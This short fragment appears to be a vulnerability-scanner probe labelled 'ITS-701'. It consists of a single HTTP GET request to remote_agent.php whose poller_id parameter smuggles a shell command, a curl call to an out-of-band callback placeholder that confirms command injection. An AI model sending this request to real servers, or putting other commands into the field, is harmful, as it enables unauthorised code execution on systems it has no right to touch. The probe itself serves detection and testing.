# Vulnerable: ITS-701
GET /remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;curl%20{{interactsh-url}}%20-H%20'User-Agent%3a%20{{useragent}}';
